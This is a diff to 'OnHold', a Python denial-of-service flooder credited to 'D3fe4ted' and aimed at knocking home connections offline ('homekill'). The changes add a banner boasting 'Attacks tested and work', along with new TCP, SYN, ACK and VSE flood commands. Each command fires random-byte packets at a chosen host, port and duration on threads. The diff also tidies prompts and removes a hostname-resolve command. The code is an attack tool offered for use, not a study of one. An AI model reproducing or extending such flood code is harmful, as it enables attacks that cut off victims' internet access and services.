@@ -3,17 +3,35 @@
 import sys
 import socket
 import time
+import requests
 import random
 import threading
 import getpass
 import os
 
+welcome = """
+\033[31m╔════════════════════════════════════════════════════════════════╗
+\033[31m║                         \033[00mWelcome to \033[31mOn\033[00mHold!                     \033[31m║
+\033[31m║\033[01;97m                   [+] Rules and Information [+]                \033[31m║
+\033[31m║[+]==========================================================[+]║
+\033[31m║\033[01;97m   ----------- * Attacks tested and work * -----------          \033[31m║
+\033[31m║\033[01;97m   ------------- * Created by D3fe4ted * -------------          \033[31m║
+\033[31m║\033[01;97m   ----------- Press ENTER 2x to continue ------------          \033[31m║
+\033[31m╠═══════════════════════════════╦════════════════════════════════╣
+\033[31m║\033[00m         [+] Info [+]          \033[31m║\033[01;97m          [+] Rules [+]         \033[31m║
+\033[31m║                               \033[31m║\033[01;97m                                \033[31m║
+\033[31m║[+]=========================[+]\033[31m║\033[01;31m[+]==========================[+]\033[31m║
+\033[31m║\033[01;97m   - Added this welcome menu   \033[31m║\033[01;97m     No Skidripping/Skidding!   \033[31m║
+\033[31m║\033[01;97m - New methods check them out  \033[31m║\033[01;97m        No hitting the Gov!     \033[31m║
+\033[31m║                               \033[31m║\033[01;97m                                \033[31m║
+\033[31m╚═══════════════════════════════╩════════════════════════════════╝
+"""
 
 banner = """
                         \033[31m╔═╗╔╗╔╦ ╦\033[37m╔═╗╦  ╔╦╗            
                         \033[31m║ ║║║║╠═╣\033[37m║ ║║   ║║            
                         \033[31m╚═╝╝╚╝╩ ╩\033[37m╚═╝╩═╝═╩╝            
-                    ☎️ \033[31mPut those m\033[37mfs on hold ☎️
+                   ☎️  \033[31mPut those m\033[37mfs on hold ☎️
             \033[31m╔════════════════════════════════════════╗
             \033[31m║   \033[37mhomekill {ip} {port} {time} {2048}   \033[31m║
             \033[31m╚════════════════════════════════════════╝
@@ -32,6 +50,7 @@ udp = True
 tcp = True
 syn = True
 std = True
+rand = True
 homekill = True                                                
 
 #methods
@@ -190,7 +209,7 @@ def main():
 	global http
 
 	while True:
-		sys.stdout.write("\x1b]2;| LIVE: ONHOLD HomeHolder | By @d3fe4ted, ENJOY! | \x07")
+		sys.stdout.write("\x1b]2;LIVE: ONHOLD HomeHolder | By @d3fe4ted, ENJOY! \x07")
 		sin = input("\033[32muser\033[37m@\033[31monh\033[37mold~ ").lower()
 		sinput = sin.split(" ")[0]
 		if sinput == "clear":
@@ -202,12 +221,6 @@ def main():
 			exit()
 		elif sinput == "attacks":
 			print ("\033Total Attacks Running: {}\n".format (aid))
-			main()
-		elif sinput == "resolve":
-			liips += 1
-			host = sin.split(" ")[1]
-			host_ip = socket.gethostbyname(host)
-			print ("\033[31m[ONH\033[37mOLD] Host: {} \033[00m[\033[91mConverted\033[00m] {}\n".format (host, host_ip))
 			main()
 		elif sinput == "homekill":
 			if username == "Guest":
@@ -226,12 +239,80 @@ def main():
 				except socket.gaierror:
 					print ("\033[31m[ONH\033[37mOLD] Host: {} Invalid.\n".format (host))
 					main()
+		elif sinput == "tcp":
+			if username == "Guest":
+				print ("\033[31m[ONH\033[37mOLD] You Are Not Allowed To Use This Method.\n")
+				main()
+			else:
+				try:
+					sinput, host, port, timer, pack = sin.split(" ")
+					socket.gethostbyname(host)
+					print ("\033[31m[ONH\033[37mOLD] Attack sent from OnHold Client to {}".format (host))
+					punch = random._urandom(int(pack))
+					threading.Thread(target=tcpsender, args=(host, port, timer, punch)).start()
+				except ValueError:
+					print ("\033[31m[ONH\033[37mOLD] The Command {} Requires An Argument.\n".format (sinput))
+					main()
+				except socket.gaierror:
+					print ("\033[31m[ONH\033[37mOLD] Host: {} Invalid.\n".format (host))
+					main()
 		elif sinput == "stop":
 			print ("\033[31m[ONH\033[37mOLD] All Running Attacks Have Been Stopped.\n")
 			attack = False
 			while not attack:
 				if aid == 0:
 					attack = True
+		elif sinput == "syn":
+			if username == "Guest":
+				print ("\033[31m[ONH\033[37mOLD] You Are Not Allowed To Use This Method.\n")
+				main()
+			else:
+				try:
+					sinput, host, port, timer, pack = sin.split(" ")
+					socket.gethostbyname(host)
+					print ("\033[31m[ONH\033[37mOLD] Attack sent from OnHold Client to {}".format (host))
+					punch = random._urandom(int(pack))
+					threading.Thread(target=synsender, args=(host, port, timer, punch)).start()
+				except ValueError:
+					print ("\033[31m[ONH\033[37mOLD] The Command {} Requires An Argument.\n".format (sinput))
+					main()
+				except socket.gaierror:
+					print ("\033[31m[ONH\033[37mOLD] Host: {} Invalid.\n".format (host))
+					main()
+		elif sinput == "ack":
+			if username == "Guest":
+				print ("\033[31m[ONH\033[37mOLD] You Are Not Allowed To Use This Method.\n")
+				main()
+			else:
+				try:
+					sinput, host, port, timer, pack = sin.split(" ")
+					socket.gethostbyname(host)
+					print ("\033[31m[ONH\033[37mOLD] Attack sent from OnHold Client to {}".format (host))
+					punch = random._urandom(int(pack))
+					threading.Thread(target=acksender, args=(host, port, timer, punch)).start()
+				except ValueError:
+					print ("\033[31m[ONH\033[37mOLD] The Command {} Requires An Argument.\n".format (sinput))
+					main()
+				except socket.gaierror:
+					print ("\033[31m[ONH\033[37mOLD] Host: {} Invalid.\n".format (host))
+					main()
+		elif sinput == "vse":
+			if username == "Guest":
+				print ("\033[31m[ONH\033[37mOLD] You Are Not Allowed To Use This Method.\n")
+				main()
+			else:
+				try:
+					sinput, host, port, timer, pack = sin.split(" ")
+					socket.gethostbyname(host)
+					print ("\033[31m[ONH\033[37mOLD] Attack sent from OnHold Client to {}".format (host))
+					punch = random._urandom(int(pack))
+					threading.Thread(target=vsesender, args=(host, port, timer, punch)).start()
+				except ValueError:
+					print ("\033[31m[ONH\033[37mOLD] The Command {} Requires An Argument.\n".format (sinput))
+					main()
+				except socket.gaierror:
+					print ("\033[31m[ONH\033[37mOLD] Host: {} Invalid.\n".format (host))
+					main()
 		elif sinput == "stop":
 			what = sin.split(" ")[1]
 			if what == "udp":
@@ -259,17 +340,17 @@ try:
 	users = "root"
 	clear = "clear"
 	os.system (clear)
-	username = getpass.getpass ("[+] Username: ")
+	username = getpass.getpass ("\033[31m╔════════════════════════════════════════════════════════════════╗\n\033[31m║                         \033[00mWelcome to \033[31mOn\033[00mHold!                     \033[31m║\n\033[31m║                   \033[00m[+] Rules and Information [+]                \033[31m║\n\033[31m║[+]==========================================================[+]\033[31m║\n\033[31m║      \033[00m----------- * Attacks tested and work * -----------       \033[31m║\n\033[31m║      \033[00m------------- * Created by D3fe4ted * -------------       \033[31m║\n\033[31m║      \033[00m----------- Press ENTER 2x to continue ------------       \033[31m║\n\033[31m╠═══════════════════════════════╦════════════════════════════════╣\n\033[31m║         \033[00m[+] Info [+]          \033[31m║          \033[00m[+] Rules [+]         \033[31m║\n\033[31m║                               ║                                \033[31m║\n\033[31m║[+]=========================[+]║[+]==========================[+]\033[31m║\n\033[31m║   \033[00m- Added this welcome menu   \033[31m║     \033[00mNo Skidripping/Skidding!   \033[31m║\n\033[31m║ \033[00m- New methods check them out  \033[31m║        \033[00mNo hitting the Gov!     \033[31m║\n\033[31m║                               ║                                \033[31m║\n\033[31m╚═══════════════════════════════╩════════════════════════════════╝\n Going Once >  ")
 	if username in users:
 		user = username
 	else:
-		print ("[+] Incorrect, Dick face its {root}.\n")
+		print ("[+] Invalid Input\n")
 		exit()
 except KeyboardInterrupt:
 	exit()
 try:
 	passwords = [""]
-	password = getpass.getpass ("[+] Password: ")
+	password = getpass.getpass (" Going Twice >  ")
 	if user == "":
 		if password == passwords[0]:
 			os.system (clear)
